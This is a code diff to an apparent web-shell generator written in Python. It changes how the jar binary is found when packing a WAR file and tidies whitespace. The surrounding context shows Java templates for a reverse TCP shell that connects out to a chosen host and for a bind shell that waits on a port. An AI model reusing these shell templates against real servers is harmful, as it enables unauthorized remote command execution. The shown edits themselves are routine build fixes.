@@ -266,16 +266,28 @@ Created-By: %s (Sun Microsystems Inc.)
     logger.debug('Generating WAR file at: "%s"' % outpath)
 
     packing = None
-    if os.path.exists('/bin/jar'):
-        packing = commands.getstatusoutput('jar -cvf %s *' % outpath)
-    elif os.path.exists('/bin/fastjar'):  # archlinux command equivalent
-        packing = commands.getstatusoutput('fastjar -cvf %s *' % outpath)
-    else:
-        logger.debug('jar or fastjar command not found')
-        raise MissingDependencyError
+    jarpath = None
 
+    # fastjar is an archlinux equivalent.
+    jarlocs = ['/bin/jar', '/usr/bin/jar', '/bin/fastjar']
+    for l in jarlocs:
+        if os.path.exists(l):
+            jarpath = l
+
+    if not jarpath:
+        # In order to avoid using `which` command which may not be available
+        # on every system, we are going to iterate through PATH
+        target = 'jar'
+        for path in os.environ['PATH'].split(os.pathsep):
+            if os.path.exists(os.path.join(path, target)):
+                jarpath = os.path.join(path, target)
+
+        if not jarpath:
+            logger.debug('jar or fastjar command not found')
+            raise MissingDependencyError
+
+    packing = commands.getstatusoutput('"%s" -cvf %s *' % (jarpath, outpath))
     os.chdir(cwd)
-
     logger.debug(packing[1])
 
     tree = commands.getstatusoutput('tree %s' % dirpath)[1]
@@ -308,7 +320,7 @@ def prepareTcpShellCode(opts):
     mode = chooseShellFunctionality(opts)
     if mode == 1:
         # Reverse TCP
-        socketInvocation = ''' 
+        socketInvocation = '''
 		/* Reverse shell */
 		Socket socket = new Socket( "%(host)s", %(port)s );
 		Process process = Runtime.getRuntime().exec( ShellPath );
@@ -318,7 +330,7 @@ def prepareTcpShellCode(opts):
         logger.debug('Preparing additional code for Reverse TCP shell')
     elif mode == 2:
         # Bind shell
-        socketInvocation = ''' 
+        socketInvocation = '''
 		/* Bind shell */
 		ServerSocket server_socket = new ServerSocket( %(port)s );
 		Socket client_socket = server_socket.accept();
